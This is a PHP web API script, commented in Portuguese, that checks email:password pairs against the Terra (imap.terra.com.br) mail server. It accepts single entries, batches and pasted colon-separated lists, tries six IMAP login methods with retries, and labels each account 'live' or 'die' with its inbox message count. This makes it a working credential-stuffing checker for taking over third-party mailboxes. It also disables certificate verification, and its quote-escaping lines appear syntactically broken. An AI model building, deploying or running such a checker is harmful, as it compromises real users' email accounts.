<?php
/**
 * api.php — Validador IMAP Terra (VERSÃO DEFINITIVA)
 * 6 métodos de conexão + STARTTLS fallback + cURL
 */
declare(strict_types=1);
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

class TerraValidator {
    private array $config;
    private array $diag = [];
    private string $diagStr = '';

    public function __construct() {
        $this->config = [
            'imap_server'   => 'imap.terra.com.br',
            'imap_port'      => 993,
            'imap_port_alt'  => 143,
            'timeout'        => 25,
            'max_retries'    => 2,
        ];
    }

    // ════════════════════════════════════════════════════════
    //  API PÚBLICA
    // ════════════════════════════════════════════════════════

    public function validate(string $email, string $password): array {
        $attempt  = 0;
        $last_err = '';
        $start    = microtime(true);

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            $this->diag = [];

            try {
                $result = $this->tryAllMethods($email, $password);

                if ($result['status'] === 'live') {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                $last_err = $result['message'] ?? 'Erro';

                if (($result['reason'] ?? '') === 'invalid_credentials') {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    $result['debug']      = implode(' | ', $this->diag);
                    return $result;
                }

                if (!($result['retryable'] ?? false)) {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    $result['debug']      = implode(' | ', $this->diag);
                    return $result;
                }
            } catch (\Throwable $e) {
                $last_err = $e->getMessage();
                $this->diag[] = 'Throwable: ' . $last_err;
            }

            if ($attempt < $this->config['max_retries']) {
                usleep((int)(pow(2, $attempt - 1) * 500000));
            }
        }

        return [
            'status'      => 'die',
            'email'       => $email,
            'attempts'    => $attempt,
            'last_error'  => $last_err,
            'reason'      => 'max_retries_exceeded',
            'elapsed_ms'  => round((microtime(true) - $start) * 1000, 2),
            'debug'       => implode(' | ', $this->diag),
            'timestamp'   => date('Y-m-d H:i:s'),
        ];
    }

    public function validateBatch(array $credentials): array {
        $results = [];
        foreach ($credentials as $cred) {
            $email    = $cred['email']    ?? '';
            $password = $cred['password'] ?? '';

            if ($email === '' || $password === '') {
                $results[] = ['email' => $email, 'status' => 'error', 'message' => 'Vazio'];
                continue;
            }
            $results[] = $this->validate($email, $password);
        }
        return [
            'total'     => count($results),
            'live'      => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
            'die'       => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
            'results'   => $results,
            'timestamp' => date('Y-m-d H:i:s'),
        ];
    }

    public function diagnostic(): array {
        $r = [
            'server'  => $this->config['imap_server'],
            'php_ver' => PHP_VERSION,
            'ssl_ext' => extension_loaded('openssl') ? 'yes' : 'NO',
            'curl_ext'=> extension_loaded('curl') ? 'yes' : 'NO',
            'imap_ext'=> extension_loaded('imap') ? 'yes' : 'NO',
            'tests'   => [],
        ];

        // DNS
        $ips = @gethostbynamel($this->config['imap_server']);
        $r['tests']['dns'] = ['ok' => !empty($ips), 'ips' => $ips ?: []];
        if (empty($ips)) {
            $r['tests']['dns']['error'] = 'DNS falhou';
            return $r;
        }

        // TCP 993
        $t = microtime(true);
        $tcp993 = @fsockopen($ips[0], 993, $e, $s, 10);
        $r['tests']['tcp_993'] = ['ok' => $tcp993 !== false, 'ms' => round((microtime(true)-$t)*1000,2)];
        if ($tcp993 === false) {
            $r['tests']['tcp_993']['error'] = "errno={$e}; {$s}";
            $r['tests']['tcp_993']['hint'] = 'Porta 993 BLOQUEADA pelo hosting';
        } else { fclose($tcp993); }

        // TCP 143
        $t = microtime(true);
        $tcp143 = @fsockopen($ips[0], 143, $e2, $s2, 10);
        $r['tests']['tcp_143'] = ['ok' => $tcp143 !== false, 'ms' => round((microtime(true)-$t)*1000,2)];
        if ($tcp143 === false) {
            $r['tests']['tcp_143']['error'] = "errno={$e2}; {$s2}";
        } else { fclose($tcp143); }

        // SSL 993
        if ($tcp993 !== false) {
            $t = microtime(true);
            $ssl = @fsockopen('ssl://' . $this->config['imap_server'], 993, $e3, $s3, 10);
            $r['tests']['ssl_993'] = ['ok' => $ssl !== false, 'ms' => round((microtime(true)-$t)*1000,2)];
            if ($ssl) {
                stream_set_timeout($ssl, 10);
                $g = @fgets($ssl, 8192);
                $r['tests']['ssl_993']['greeting'] = $g ?: '(vazio)';
                $r['tests']['ssl_993']['imap_ok'] = ($g && stripos($g, 'OK') !== false);
                fclose($ssl);
            } else {
                $r['tests']['ssl_993']['error'] = "errno={$e3}; {$s3}";
            }
        }

        // cURL IMAP
        if (extension_loaded('curl')) {
            $r['tests']['curl_imap'] = $this->testCurlImap();
        }

        $r['can_connect'] = ($r['tests']['tcp_993']['ok'] ?? false) || ($r['tests']['tcp_143']['ok'] ?? false);
        $r['port_993_blocked'] = !($r['tests']['tcp_993']['ok'] ?? false);
        $r['port_143_blocked'] = !($r['tests']['tcp_143']['ok'] ?? false);

        return $r;
    }

    // ════════════════════════════════════════════════════════
    //  TENTA TODOS OS MÉTODOS DE CONEXÃO
    // ════════════════════════════════════════════════════════

    private function tryAllMethods(string $email, string $password): array {
        // Método 1: cURL imaps://
        if (extension_loaded('curl')) {
            $r = $this->methodCurl($email, $password);
            if ($r !== null) return $r;
        }

        // Método 2: fsockopen ssl:// porta 993
        $r = $this->methodFsockSSL($email, $password);
        if ($r !== null) return $r;

        // Método 3: stream_socket ssl:// porta 993
        $r = $this->methodStreamSSL($email, $password);
        if ($r !== null) return $r;

        // Método 4: stream_socket tls:// porta 993
        $r = $this->methodStreamTLS($email, $password);
        if ($r !== null) return $r;

        // Método 5: Porta 143 + STARTTLS
        $r = $this->methodStartTLS($email, $password);
        if ($r !== null) return $r;

        // Método 6: imap_open (se disponível)
        if (extension_loaded('imap')) {
            $r = $this->methodImapExt($email, $password);
            if ($r !== null) return $r;
        }

        // Todos falharam
        return [
            'status'    => 'die',
            'email'     => $email,
            'message'   => 'Todos os métodos de conexão falharam',
            'reason'    => 'connection_error',
            'retryable' => true,
        ];
    }

    // ─── MÉTODO 1: cURL ───
    private function methodCurl(string $email, string $password): ?array {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => 'imaps://imap.terra.com.br:993/INBOX',
            CURLOPT_USERNAME       => $email,
            CURLOPT_PASSWORD       => $password,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => $this->config['timeout'],
            CURLOPT_CONNECTTIMEOUT => $this->config['timeout'],
            CURLOPT_NOSIGNAL       => 1,
            CURLOPT_CUSTOMREQUEST  => 'STATUS INBOX (MESSAGES)',
        ]);

        $result = curl_exec($ch);
        $err    = curl_error($ch);
        $code   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($result !== false) {
            $this->diag[] = 'cURL: sucesso';
            $msgs = 0;
            if (preg_match('/MESSAGES\s+(\d+)/i', (string)$result, $m)) {
                $msgs = (int)$m[1];
            }
            return [
                'status'           => 'live',
                'email'            => $email,
                'message'          => 'OK via cURL',
                'mailbox_messages' => $msgs,
                'method'           => 'curl_imaps',
                'authenticated_at' => date('Y-m-d H:i:s'),
            ];
        }

        $errLower = strtolower($err);
        $this->diag[] = "cURL falhou: {$err} (code={$code})";

        // Credenciais inválidas
        if (strpos($errLower, 'login') !== false || strpos($errLower, 'auth') !== false ||
            strpos($errLower, 'credential') !== false || strpos($errLower, 'access') !== false) {
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Invalid credentials',
                'reason'    => 'invalid_credentials',
                'retryable' => false,
                'method'    => 'curl_imaps',
            ];
        }

        return null; // Tenta próximo método
    }

    // ─── MÉTODO 2: fsockopen ssl:// ───
    private function methodFsockSSL(string $email, string $password): ?array {
        $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $this->config['timeout']);
        if ($socket === false) {
            $this->diag[] = "fsock(ssl://993) falhou: errno={$errno} {$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'fsock_ssl_993');
    }

    // ─── MÉTODO 3: stream_socket ssl:// ───
    private function methodStreamSSL(string $email, string $password): ?array {
        $ctx = stream_context_create(['ssl' => [
            'verify_peer'       => false,
            'verify_peer_name'  => false,
            'allow_self_signed' => true,
        ]]);
        $socket = @stream_socket_client(
            'ssl://imap.terra.com.br:993',
            $errno, $errstr,
            $this->config['timeout'],
            STREAM_CLIENT_CONNECT, $ctx
        );
        if ($socket === false) {
            $this->diag[] = "stream(ssl://993) falhou: errno={$errno} {$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'stream_ssl_993');
    }

    // ─── MÉTODO 4: stream_socket tls:// ───
    private function methodStreamTLS(string $email, string $password): ?array {
        $ctx = stream_context_create(['ssl' => [
            'verify_peer'       => false,
            'verify_peer_name'  => false,
            'allow_self_signed' => true,
        ]]);
        $socket = @stream_socket_client(
            'tls://imap.terra.com.br:993',
            $errno, $errstr,
            $this->config['timeout'],
            STREAM_CLIENT_CONNECT, $ctx
        );
        if ($socket === false) {
            $this->diag[] = "stream(tls://993) falhou: errno={$errno} {$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'stream_tls_993');
    }

    // ─── MÉTODO 5: Porta 143 + STARTTLS ───
    private function methodStartTLS(string $email, string $password): ?array {
        // Conecta na porta 143 sem SSL
        $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $this->config['timeout']);
        if ($socket === false) {
            $this->diag[] = "fsock(tcp://143) falhou: errno={$errno} {$errstr}";
            return null;
        }

        stream_set_timeout($socket, $this->config['timeout']);

        // Lê greeting
        $greeting = @fgets($socket, 8192);
        if ($greeting === false || stripos($greeting, 'OK') === false) {
            fclose($socket);
            $this->diag[] = 'STARTTLS: greeting inválido: ' . ($greeting ?: 'vazio');
            return null;
        }

        // Envia STARTTLS
        fwrite($socket, "A001 STARTTLS\r\n");
        $resp = $this->readUntilTag($socket, 'A001');

        if ($resp === null || !preg_match('/A001\s+OK/i', $resp)) {
            fclose($socket);
            $this->diag[] = 'STARTTLS rejeitado: ' . trim($resp ?? 'vazio');
            return null;
        }

        // Habilita TLS sobre o socket existente
        $crypto_ok = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($crypto_ok !== true) {
            fclose($socket);
            $this->diag[] = 'STARTTLS: crypto falhou';
            return null;
        }

        $this->diag[] = 'STARTTLS: TLS habilitado na porta 143';
        return $this->doImapLogin($socket, $email, $password, 'starttls_143');
    }

    // ─── MÉTODO 6: imap_open ───
    private function methodImapExt(string $email, string $password): ?array {
        $mailbox = '{imap.terra.com.br:993/imap/ssl/novalidate-cert}';
        $conn = @imap_open($mailbox, $email, $password, OP_READONLY, 1, ['DISABLE_AUTHENTICATOR' => 'GSSAPI']);

        if ($conn !== false) {
            $info = @imap_mailboxmsginfo($conn);
            $msgs = $info->Nmsgs ?? 0;
            @imap_close($conn);
            $this->diag[] = 'imap_open: sucesso';
            return [
                'status'           => 'live',
                'email'            => $email,
                'message'          => 'OK via imap_open',
                'mailbox_messages' => $msgs,
                'method'           => 'imap_ext',
                'authenticated_at' => date('Y-m-d H:i:s'),
            ];
        }

        $err = imap_last_error();
        $this->diag[] = "imap_open falhou: {$err}";

        if (stripos($err, 'invalid') !== false || stripos($err, 'login') !== false) {
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Invalid credentials',
                'reason'    => 'invalid_credentials',
                'retryable' => false,
                'method'    => 'imap_ext',
            ];
        }

        return null;
    }

    // ════════════════════════════════════════════════════════
    //  PROTOCOLO IMAP (socket manual)
    // ════════════════════════════════════════════════════════

    private function doImapLogin($socket, string $email, string $password, string $method): ?array {
        stream_set_timeout($socket, $this->config['timeout']);

        // Greeting
        $greeting = @fgets($socket, 8192);
        if ($greeting === false || $greeting === '') {
            fclose($socket);
            $this->diag[] = "{$method}: greeting vazio";
            return null;
        }
        if (stripos($greeting, 'OK') === false) {
            fclose($socket);
            $this->diag[] = "{$method}: greeting sem OK";
            return null;
        }
        $this->diag[] = "{$method}: greeting OK";

        // LOGIN
        $tag = 'L001';
        $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
        $safe_pass  = str_replace(['\', '"'], ['\\', '\"'], $password);
        $cmd = "{$tag} LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n";

        if (fwrite($socket, $cmd) === false) {
            fclose($socket);
            $this->diag[] = "{$method}: falha ao enviar LOGIN";
            return null;
        }

        $response = $this->readUntilTag($socket, $tag);
        $meta = stream_get_meta_data($socket);

        if ($response === null || $response === '') {
            fclose($socket);
            $this->diag[] = "{$method}: resposta vazia";
            return null;
        }

        if (!empty($meta['timed_out'])) {
            fclose($socket);
            $this->diag[] = "{$method}: timeout";
            return null;
        }

        $qt = preg_quote($tag, '/');

        // OK
        if (preg_match('/' . $qt . '\s+OK/i', $response)) {
            $msgs = 0;
            fwrite($socket, "S001 STATUS INBOX (MESSAGES)\r\n");
            $sresp = $this->readUntilTag($socket, 'S001');
            if ($sresp && preg_match('/MESSAGES\s+(\d+)/i', $sresp, $m)) {
                $msgs = (int)$m[1];
            }
            fwrite($socket, "X001 LOGOUT\r\n");
            fclose($socket);

            $this->diag[] = "{$method}: login OK";
            return [
                'status'           => 'live',
                'email'            => $email,
                'message'          => 'Autenticação bem-sucedida',
                'mailbox_messages' => $msgs,
                'method'           => $method,
                'authenticated_at' => date('Y-m-d H:i:s'),
            ];
        }

        // NO = credenciais inválidas
        if (preg_match('/' . $qt . '\s+NO/i', $response)) {
            fclose($socket);
            $this->diag[] = "{$method}: credenciais inválidas";
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Invalid credentials',
                'reason'    => 'invalid_credentials',
                'retryable' => false,
                'method'    => $method,
            ];
        }

        // BAD
        if (preg_match('/' . $qt . '\s+BAD/i', $response)) {
            fclose($socket);
            $this->diag[] = "{$method}: BAD - " . trim($response);
            return null; // Tenta próximo método
        }

        fclose($socket);
        $this->diag[] = "{$method}: resposta inesperada";
        return null;
    }

    // ─── Helpers ───

    private function readUntilTag($socket, string $tag): ?string {
        $buffer = '';
        $deadline = microtime(true) + $this->config['timeout'];

        while (!feof($socket)) {
            $line = @fgets($socket, 8192);
            if ($line === false) break;
            $buffer .= $line;
            if (strpos(trim($line), $tag . ' ') === 0) return $buffer;
            $meta = stream_get_meta_data($socket);
            if (!empty($meta['timed_out'])) break;
            if (microtime(true) > $deadline) break;
        }
        return $buffer !== '' ? $buffer : null;
    }

    private function testCurlImap(): array {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => 'imaps://imap.terra.com.br:993/',
            CURLOPT_USERNAME       => 'test@test.com',
            CURLOPT_PASSWORD       => 'test',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_NOSIGNAL       => 1,
        ]);
        $result = curl_exec($ch);
        $err = curl_error($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return [
            'ok'   => $result !== false,
            'err'  => $err,
            'code' => $code,
        ];
    }
}

// ════════════════════════════════════════════════════════════════
//  ROTEAMENTO
// ════════════════════════════════════════════════════════════════

$action = $_GET['action'] ?? '';
$validator = new TerraValidator();

if ($action === 'diagnostic') {
    echo json_encode($validator->diagnostic(), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

if ($action === 'check' || $action === '') {
    $input = $_POST;
    $ct = $_SERVER['CONTENT_TYPE'] ?? '';

    if (empty($input) && stripos($ct, 'application/json') !== false) {
        $raw = file_get_contents('php://input');
        if (!empty($raw)) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) $input = $decoded;
        }
    }

    $email    = $input['email']    ?? '';
    $password = $input['password'] ?? '';
    $batch    = $input['batch']    ?? null;

    if ($email === '' && !empty($input['cred'])) {
        $parts = explode(':', $input['cred'], 2);
        if (count($parts) === 2) {
            $email = trim($parts[0]);
            $password = trim($parts[1]);
        }
    }

    if ($email === '' && empty($batch) && !empty($input['list'])) {
        $lines = array_filter(array_map('trim', explode("\n", $input['list'])));
        $batch = [];
        foreach ($lines as $line) {
            $parts = explode(':', $line, 2);
            if (count($parts) === 2) {
                $batch[] = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
            }
        }
    }

    if ($batch && is_array($batch) && count($batch) > 0) {
        echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } elseif ($email !== '' && $password !== '') {
        echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } else {
        http_response_code(400);
        echo json_encode([
            'error' => 'Credenciais ausentes',
            'usage' => [
                'json'  => 'POST {"email":"user@terra.com.br","password":"senha"}',
                'form'  => 'POST email=user@terra.com.br&password=senha',
                'cred'  => 'POST cred=user@terra.com.br:senha',
                'batch' => 'POST {"batch":[{"email":"...","password":"..."}]}',
            ],
            'diagnostic' => 'GET /api.php?action=diagnostic',
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
    exit;
}

http_response_code(404);
echo json_encode(['error' => 'Action desconhecida: ' . $action], JSON_UNESCAPED_UNICODE);
